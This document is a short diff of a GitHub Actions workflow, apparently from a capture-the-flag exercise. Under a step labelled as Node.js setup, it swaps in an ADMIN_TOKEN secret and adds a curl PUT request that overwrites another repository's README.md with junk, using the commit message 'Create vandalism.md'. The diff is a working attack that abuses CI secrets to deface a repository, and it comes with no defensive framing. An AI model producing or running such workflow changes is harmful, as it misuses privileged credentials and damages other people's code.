@@ -9,6 +9,6 @@ jobs:
       - name: Use Node.js ${{ matrix.node-version }}
         uses: actions/setup-node@v1
         env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GITHUB_TOKEN: ${{ secrets.ADMIN_TOKEN }}
       - run: |
-          curl -X PUT -H "Authorization: bearer $GITHUB_TOKEN" https://api.github.com/repos/ctf-registration/contents/aa.md --data '{"message": "Create vandalism.md", "content": "aaa"}'
+          curl -X PUT -H "Authorization: bearer $GITHUB_TOKEN" https://api.github.com/repos/incredibly-secure-naortalmor1/contents/README.md --data '{"message": "Create vandalism.md", "content": "aaa"}'
